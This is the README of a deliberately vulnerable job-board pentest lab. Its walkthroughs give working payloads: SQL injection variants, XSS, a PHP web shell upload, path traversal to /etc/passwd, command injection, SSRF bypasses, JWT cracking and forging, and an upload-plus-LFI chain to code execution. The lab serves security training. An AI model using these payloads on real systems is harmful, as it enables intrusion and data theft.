# JobHunt — Intentionally Vulnerable Job Board (Pentest Lab)

> ⚠️ **EDUCATIONAL PURPOSES ONLY.**
> This is a deliberately broken clone of a job-board site (in the style of VietnamWorks), built
> to practice web application penetration testing in a safe, local, offline environment.
> It contains real, exploitable vulnerabilities on purpose.
>
> - Do **not** deploy this anywhere reachable from the internet.
> - Do **not** reuse any code, pattern, or secret from this project in a real application.
> - Only attack this instance. Techniques practiced here against systems you do not own or
>   do not have explicit written authorization to test are illegal in most jurisdictions.
> - All data (companies, jobs, people) is fictional.

---

## 1. What this is

JobHunt is a 3-role job board (candidate / employer / admin) running on a realistic small-shop
stack: **Nginx (TLS) → PHP-FPM 8.2 → MySQL 8**, wired up with Docker Compose. The vulnerabilities
are not toy `eval($_GET['x'])` one-liners — each one is a plausible mistake a real team makes
while trying (and half-succeeding) to fix a real security finding. Every vulnerable code path has
an inline comment explaining what the developer was thinking and why the fix didn't actually
close the hole. That's the point of the exercise: most real bugs survive a first attempt at
"we fixed it."

## 2. Stack

```
Internet
   │  :80 / :443 only
   ▼
┌─────────┐   backend network    ┌─────────┐   backend network   ┌─────────┐
│  nginx  │──────────────────────▶│   php   │─────────────────────▶│  mysql  │
│ (TLS)   │  fastcgi :9000        │ (8.2-fpm)│  :3306               │  8.0    │
└─────────┘                       └─────────┘                      └─────────┘
```

- **nginx**: terminates TLS (self-signed cert generated by `make ssl`), reverse-proxies `.php`
  requests to php-fpm, serves everything else (and `/uploads`) as static files. Only nginx
  publishes ports to the host (80, 443).
- **php**: PHP 8.2-FPM. Port 9000 is **not** published to the host — only reachable from nginx on
  the internal `backend` Docker network.
- **mysql**: MySQL 8. Port 3306 is **not** published to the host either.
- **Networks**: `frontend` (nginx ↔ internet) and `backend` (nginx ↔ php ↔ mysql, `internal:
  true` — no outbound internet access from php/mysql containers). This means SSRF payloads in
  this lab can only reach *internal* targets (php-fpm, mysql, other containers by service name),
  which is realistic and, if anything, a better teaching example than reaching the open internet.

## 3. Quick start

Requirements: Docker + Docker Compose, and `make` (Git Bash / WSL on Windows works fine).

```bash
make up      # builds images, generates a self-signed TLS cert, starts the stack, seeds demo data
```

Then open **https://localhost** (accept the self-signed certificate warning).

Other commands:

```bash
make down          # stop and remove containers
make logs           # tail all container logs
make shell-php       # shell into the php container
make shell-nginx      # shell into the nginx container
make mysql-shell       # mysql client shell
make seed            # re-run the demo data seeder (idempotent)
make ssl             # (re)generate the self-signed TLS cert only
make clean            # down -v, also removes the generated TLS cert
```

`make up` copies `.env.example` to `.env` on first run — edit `.env` if you want different demo
credentials before seeding.

## 5. Walkthroughs

### 1a. SQLi — login bypass (Medium) — `login.php`

`login.php` escapes the submitted email with `addslashes()` before building the query, and — to
work around old, mangled-encoding employer names imported from a legacy GBK system — switches the
MySQL connection to the `gbk` charset just for this query. `addslashes()` has no concept of
connection charset: under GBK, a crafted lead byte (`0xBF`) placed right before a quote gets
combined by MySQL's parser with the backslash `addslashes()` just inserted, forming one two-byte
GBK character and leaving the original quote **unescaped**. This is the textbook
"`addslashes()` is not SQL-injection-safe" example cited in most web security references.

Because the app still requires `password_verify()` to succeed after the row is fetched, a full
bypass needs a UNION-injected row carrying a password hash the attacker knows. Generate one:

```bash
docker compose exec php php -r '
$hash = password_hash("pwn12345", PASSWORD_BCRYPT);
$hex = fn($s) => "0x" . bin2hex($s);
echo "UNION payload (paste after %bf%27):\n";
echo " UNION SELECT 1,".$hex("attacker@evil.com").",".$hex($hash).",".$hex("admin").",".$hex("Hacked Admin").",0-- -\n";
'
```

Then send it as raw, manually percent-encoded bytes (a browser form will mangle the raw `0xBF`
byte, so use curl):

```bash
curl -k -i https://localhost/login.php \
  --data "email=%bf%27%20UNION%20SELECT%201,0x6174746163... (paste the rest of the payload above, URL-encoded)&password=pwn12345"
```

A successful bypass logs you in as `role=admin` without ever knowing the real admin password —
full authentication bypass **and** privilege escalation in one payload. (`%bf%27` is the fixed
GBK trigger sequence; only the UNION payload after it needs regenerating per attempt.)

### 1b. SQLi — UNION-based (Medium) — `index.php`

The job search's `salary_min` field only ever comes from a `<select>` of fixed values in the UI,
so the code skips escaping it entirely — "it's a number, not free text." Nothing stops you from
setting it directly on the query string:

```
GET /index.php?salary_min=0 UNION SELECT username,password,3,4,5,6,7 FROM information_schema... 
```

Determine the column count first (`ORDER BY N` until it errors), then UNION-select
`user()`, `database()`, or `email,password` from `users` into the columns that get echoed on the
page (title/company/location are all reflected).

### 1c. SQLi — error-based (Medium) — `job.php`

`id` is passed through `mysqli_real_escape_string()` — a real escaping function, unlike
`addslashes()` — but the query never wraps it in quotes (`WHERE j.id = $id`, no `'...'`). Escaping
a value that's never quoted does nothing, since there are no quote characters for it to protect.
`display_errors` is on and the app prints `mysqli_error()` directly:

```
GET /job.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT version())))
GET /job.php?id=1 AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)
```

The MySQL error message leaks the subquery's result.

### 1d. SQLi — blind boolean (Hard) — `companies.php`

`founded_after` gets the same "it's a dropdown value" treatment as `salary_min`, but this page
never echoes query results or errors back — only "N companies found" vs. "no companies found." A
mismatched query here is a *true/false* oracle, not a visible one:

```
GET /companies.php?founded_after=2000 AND 1=1     → companies listed
GET /companies.php?founded_after=2000 AND 1=2     → empty list
GET /companies.php?founded_after=2000 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE role='admin')='$'
```

Automate with sqlmap (`--technique=B`) once you've confirmed the true/false behavior manually.

### 1e. SQLi — blind time-based (Hard) — `index.php`

`min_exp` runs through a keyword filter that strips `SLEEP` (case-insensitive) — but with a
single, non-recursive `str_ireplace()` call. A payload that reforms the banned word after one
substitution slips straight through:

```
GET /index.php?min_exp=1 AND SLESLEEPEP(3)
```

`str_ireplace('sleep', '', 'SLESLEEPEP')` removes the middle `SLEEP`, and the two halves left
over — `SLE` + `EP` — close back up into `SLEEP`. Confirmed in this lab: a plain
`min_exp=0 AND SLESLEEPEP(3)` takes ~15s instead of ~0.1s, not exactly 3s — the condition gets
evaluated once per row the query scans (several jobs are seeded), so the delay is a multiple of
the `SLEEP` argument rather than an exact match. That's still an unambiguous signal for a
boolean/time oracle; if you're scripting real extraction, budget for the multiplier or use a
smaller sleep value (e.g. `SLESLEEPEP(1)`) and calibrate against the observed baseline first.

### 1f. SQLi — second-order (Hard) — profile bio → recommendations

`dashboard/candidate/index.php` saves the "bio" field with a fully parameterized prepared
statement — nothing malicious executes at write time, no matter what you type. Log in as a
candidate (e.g. `alice@example.com` / `Candidate123`) and set your bio to:

```
x' UNION SELECT id,email,password,role FROM users-- -
```

Now visit **`/dashboard/candidate/recommendations.php`**. That page reads your stored bio back out
of the database and drops it, unescaped, straight into a new query
(`... WHERE description LIKE '%$bio%' ...`). The payload was inert the moment it was written; it
only fires when a second, careless feature reads it back later — the defining trait of
second-order injection, and exactly why "we use prepared statements everywhere" claims still need
verifying at every place stored data gets *reused*, not just where it's *written*.

### 2a. XSS — stored (Medium) — job comments

`job.php`'s comment form runs input through `strip_tags($content, '<b><i><u><a>')`. `strip_tags()`
only removes tags that aren't on the allow-list — it does not touch attributes on the tags it
keeps. Post a comment on any job:

```html
<a href="#" onmouseover="alert(document.cookie)">hover me</a>
```

The `<a>` survives sanitization with its `onmouseover` intact and fires for every visitor who
hovers it.

### 2b. XSS — reflected (Medium) — search box

`includes/functions.php` defines a "fast" escaper, `e()`, used instead of `htmlspecialchars()` on
the search page: it replaces `<` and `>` but leaves quote characters untouched. That's fine for a
text node, but the search keyword is *also* reflected inside an HTML attribute
(`value="<?= e($keyword) ?>"` on the search input):

```
GET /index.php?q=" autofocus onfocus=alert(document.domain) x="
```

No `<` or `>` needed at all — the payload breaks out of the `value="..."` attribute using only a
double quote, which `e()` never touches.

### 2c. XSS — DOM-based (Hard) — shared-job banner

`job.php` renders a "so-and-so shared this job with you" banner client-side, reading the `ref`
query parameter and writing it into the page with `innerHTML`:

```
GET /job.php?id=1&ref=<img src=x onerror=alert(document.domain)>
```

The payload never touches the server at all — it's read from `location.search` and rendered by
JavaScript entirely in the browser, so nothing server-side (escaping, WAF rules, etc.) ever sees
it.

### 2d. CSP bypass (Hard) — every page

`send_csp_header()` sets a `Content-Security-Policy` header on every response (added after an
earlier pentest flagged missing security headers) — but it includes `script-src 'self'
'unsafe-inline' ...`. `'unsafe-inline'` allows any inline `<script>`, which defeats CSP's main
purpose as a defense-in-depth backstop against XSS: both the reflected and DOM-based payloads
above execute completely unhindered by the policy. Check `Network` tab / response headers to see
the policy is present — and still doesn't matter.

### 3a. File upload (Medium) — CV upload

`apply.php` whitelists the file extension and `$_FILES['cv']['type']` — the MIME type the
*browser* sends, entirely attacker-controlled — but never opens the file to check its actual
content. Rename a PHP file to end in `.pdf` and set the form field's MIME to `application/pdf`
(easy in Burp Repeater / curl `-F`) and it uploads without complaint:

```bash
curl -k https://localhost/apply.php?job_id=1 -b cookies.txt \
  -F 'cv=@shell.pdf;type=application/pdf' \
  -F 'cover_letter=test'
```

Where `shell.pdf` contains only `<?php system($_GET['c']); ?>`. See §9 for what this enables.

### 3b. File upload (Hard) — business verification doc, polyglot bypass

`dashboard/employer/verify_doc.php` was hardened after the CV-upload finding: it actually opens
the file and checks the first 4 bytes equal `%PDF`. That's real progress over 3a — but it only
ever reads the header. Craft a file that starts with a real PDF signature and appends PHP after
it:

```bash
printf '%%PDF-1.4\n<?php system($_GET["c"]); ?>\n%%%%EOF' > polyglot.pdf
```

The magic-byte check passes (first 4 bytes are `%PDF`), and the upload succeeds. Whether it's
*useful* depends on whether anything later `include()`s or otherwise executes the file as PHP —
which is exactly the gap `preview.php` has (§9).

### 4a. Path Traversal (Medium) — CV template download

`download.php` strips `../` from the `file` parameter with a single `str_replace()` call — one
pass, no re-scanning. An overlapping payload reforms the sequence it just removed:

```
GET /download.php?file=....//....//....//....//etc/passwd
```

`str_replace('../', '', '....//')` removes the middle `../`, leaving `..` + `/` = `../` behind —
per segment, so chain enough of them to climb out of `templates/` and back down into any path you
want.

### 4b. Path Traversal / LFI (Hard) — CV preview, double URL-encoding

`dashboard/employer/preview.php` was patched after a pentest finding (JOBHUNT-133) on this exact
endpoint: it now rejects any request whose `doc` value contains a literal `../`. It then calls
`urldecode()` on the value afterwards "to normalize paths some proxies double-encode" — and uses
*that* decoded value to build the path. `$_GET` is already decoded once by PHP itself, so a
**doubly** encoded sequence arrives at the `../` check still looking like `%2e%2e%2f` (no literal
`../`, check passes) and only becomes a real `../` after the app's own `urldecode()` call, which
nothing re-checks:

```
GET /dashboard/employer/preview.php?doc=%252e%252e%252fconfig%252fdb.php
```

(`%25` decodes to `%` once via `$_GET`; the app's own `urldecode()` then turns the remaining
`%2e%2e%2f` into `../`.) This reads (and, since the page `include()`s it — see §9 — *executes*)
arbitrary files under the web root.

### 5a. Command Injection (Medium) — webhook ping tool

`webhook_test.php`'s "ping" diagnostic blocks `;`, `|`, `&` before passing the host straight to
`shell_exec()`. A literal newline is just as good a command separator once it reaches `sh -c`, and
isn't on the list:

```
ping_host=localhost%0aid
```

`sh -c "ping -c 2 -W 2 localhost\nid 2>&1"` runs `ping` and, on the next line, `id` — both
outputs come back in the response.

### 5b. Command Injection (Hard) — admin DNS lookup

`dashboard/admin/diagnostics.php`'s "nslookup" tool was written after 5a was reported, and its
blacklist was extended to cover `;`, `|`, `&`, and newlines too — but not backticks or `$()`
command substitution, which `sh -c` expands just as readily inside what looks like a single
argument:

```
host=$(id)
host=`id`
```

`nslookup`'s own error output (it can't resolve a hostname containing spaces/parens) echoes the
substituted command's output back, e.g. `** server can't find uid=82(www-data)...: NXDOMAIN`.

### 6a. SSRF (Medium) — webhook URL

`webhook_test.php` validates the webhook URL's host against `['localhost', '127.0.0.1']` — a
string blocklist, not a real IP-range check:

```
webhook_url=http://0.0.0.0/
```

`0.0.0.0` is not in the list, but every major OS (and this Docker network) routes it right back to
the local machine issuing the request. Because the `backend` network is `internal: true`, try
pointing it at other internal services too, e.g. `http://php:9000` or `http://mysql:3306` — the
webhook fetcher will happily connect (though it can't speak FastCGI/MySQL's binary protocol, the
attempted connection and whatever banner text comes back is still visible SSRF impact).

### 6b. SSRF (Hard) — website verification

`verify_website.php` was hardened after 6a: instead of string-matching, it resolves the real
private/reserved IP range via `filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE |
FILTER_FLAG_NO_RES_RANGE)`. The gap: that range check only runs when `filter_var($host,
FILTER_VALIDATE_IP)` recognizes the host as a *standard* dotted-quad/colon-hex IP first. Decimal,
octal, and hex forms of an IP aren't "valid IPs" as far as that function is concerned, so they
skip the range check entirely, while the resolver that actually opens the connection understands
them fine:

```
website_url=http://2130706433/        # decimal for 127.0.0.1
website_url=http://017700000001/      # octal for 127.0.0.1
website_url=http://0x7f000001/        # hex for 127.0.0.1
```

(Resolver support for these forms varies by OS/library — try more than one. This is realistic:
real SSRF bypass hunting is exactly this kind of "try the encodings the validator's author didn't
think of.")

### 7a. IDOR (Medium) — CV viewer

`dashboard/candidate/applications.php` (the listing page) correctly scopes its query to
`candidate_id = <you>`. But the endpoint it links to for viewing a CV,
`dashboard/candidate/cv_view.php?application_id=N`, only checks that *someone* is logged in — not
that the application belongs to them:

```
GET /dashboard/candidate/cv_view.php?application_id=1
GET /dashboard/candidate/cv_view.php?application_id=2
...
```

Log in as any candidate and iterate `application_id` to read every other candidate's CV.

### 7b. IDOR — mass assignment (Hard) — profile update

`dashboard/candidate/index.php`'s profile form only *shows* fields for name/phone/headline/
bio/skills. Server-side, the `users` table update is driven by a generic list,
`$allowedUserFields = ['full_name', 'phone', 'role', 'is_verified']`, built to avoid hand-writing
an `UPDATE` for every new profile field — and `role`/`is_verified` never got pulled back out after
a related feature was cut. POST fields that aren't in the HTML form at all still update:

```bash
curl -k -b cookies.txt https://localhost/dashboard/candidate/index.php \
  --data "full_name=Alice&phone=&headline=&bio=&skills=&experience_years=0&role=admin&is_verified=1"
```

Log back in afterward — the account's role is now `admin`.

### 8a. JWT — weak secret (Medium) — mobile API

`api/auth.php` issues HS256 tokens signed with `JWT_SECRET` (see `.env.example` —
`jobhunt123`), a short dictionary word left over from when the mobile API was a proof of concept.
Capture any token from `POST /api/auth.php`, crack the secret offline:

```bash
hashcat -a 0 -m 16500 token.txt rockyou.txt   # mode 16500 = JWT (HS256)
```

Once you have the secret, forge a token for any user/role with a small script and call any
protected endpoint, e.g. `GET /api/admin_stats.php` with `Authorization: Bearer <forged token>`
and `"role":"admin"` in the payload — full privilege escalation with no account at all.

### 8b. JWT — algorithm confusion (Hard) — SSO passthrough

`api/sso_verify.php` accepts tokens from a (fictional) partner recruiter platform, signed with
RS256 using a keypair whose **public** half is deliberately, correctly public at
`GET /api/jwks.php`. `jwt_verify_flexible()` in `config/jwt.php` branches on the algorithm named
in the token's own header: for `RS256` it verifies against the RSA public key (correct); for
`HS256` it reuses that *same public key string* as the HMAC secret (the bug — the function was
written by copying the normal HS256 verifier and "just adding RSA support," without noticing that
reusing public key material as a symmetric secret means anyone who can read the public key can
also forge signatures with it).

```bash
python3 - <<'EOF'
import json, urllib.request, ssl, hmac, hashlib, base64, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with urllib.request.urlopen("https://localhost/api/jwks.php", context=ctx) as r:
    pubkey = json.load(r)["public_key_pem"].encode()  # keep as bytes — on
    # Windows, writing this through a text-mode file/print() first can
    # silently turn \n into \r\n and change the key bytes, breaking the
    # forged signature. Use it as bytes directly, as below.

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": 1, "email": "admin@jobhunt.local", "role": "admin", "exp": int(time.time()) + 3600}
h = b64url(json.dumps(header).encode())
p = b64url(json.dumps(payload).encode())
sig = hmac.new(pubkey, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{b64url(sig)}")
EOF

curl -sk https://localhost/api/sso_verify.php -H "Authorization: Bearer <token from above>"
```

The server accepts the forged token and reports `"impersonated_as": {"role": "admin", ...}` — a
complete authentication bypass built entirely from public information.

### 9. Exploit chain — CV upload + LFI → RCE (Hard)

Combines 3a (upload) and 4b (LFI) into full remote code execution, entirely self-service:

1. **Register two accounts** (candidate + employer — JobHunt lets you self-select role at
   signup).
2. As the **candidate**, apply to any job with a CV file whose *name* ends in `.pdf` but whose
   *content* is:
   ```php
   <?php system($_GET['c']); ?>
   ```
   `apply.php` (3a) only checks extension + client-supplied MIME, so this uploads fine, stored as
   `uploads/cv_<id>_<random>.pdf`.
3. As the **employer**, post a job and note its candidate list at
   `dashboard/employer/candidates.php` — find the "Xem CV" link for the application above; note
   the stored filename it points `preview.php?doc=` at.
4. `preview.php` (4b) `include()`s whatever `doc` resolves to — including, unmodified, your
   uploaded CV. Since the file it's pointed at is *already* under `uploads/`, you don't even need
   the traversal bug for this step — a direct filename is enough:
   ```
   GET /dashboard/employer/preview.php?doc=cv_3_a1b2c3d4e5f6.pdf&c=id
   ```
5. The response includes the output of `id` — arbitrary command execution as the `www-data` user
   inside the `php` container.

The double-encoding traversal from 4b matters when you want to reach a file *outside*
`uploads/` (e.g. another user's upload, or a config file) rather than one you control — combine
both bugs for the general case: `doc=%252e%252e%252f...` to escape the directory, landing on any
file readable by the php-fpm process, then request it through `preview.php` to have it executed
rather than merely read.

**Why this matters as a chain**: neither bug alone is full RCE. The upload flaw alone just gets an
attacker-controlled file onto disk with a "safe" extension nginx won't execute. The LFI alone just
reads files. It's the *combination* — a write primitive plus an `include()` that doesn't care
what extension the file has — that turns two separate Medium/Hard findings into a critical one.
This is the most important lesson in the whole lab: rating vulnerabilities in isolation
underestimates real risk when an attacker can chain them.

## 6. Notes on the intentionally-weak infrastructure

A few things outside the "9 vulnerability classes" above are also deliberately configured
insecurely, because a real box that's been running for a while usually has some of these too:

- `display_errors = On` and `expose_php = On` in `docker/php/php.ini` — verbose errors and a
  version-revealing header, "for debugging," never turned off.
- `APP_ENV` is always `development` (`.env.example`) — gates meant to suppress debug output in
  production silently never engage.
- Session cookies are `httponly` + `SameSite=Lax` but there's no CSRF token anywhere in the app —
  every state-changing form (`POST` requests throughout) is forgeable cross-site. Not one of the
  9 requested classes, but worth noticing while you're in there.
- `docker/php/php.ini` leaves `open_basedir` unset — without that gap, the LFI in §4b/§9 would be
  far less useful even after finding it.

## 7. Resetting the lab

```bash
make clean   # removes containers, volumes (including the MySQL data volume), and the TLS cert
make up      # rebuild from scratch, reseed demo data
```

Uploaded files under `src/uploads/` are **not** removed by `make clean` (they live on the host
filesystem via the bind mount) — delete that directory's contents manually if you want a fully
clean slate.
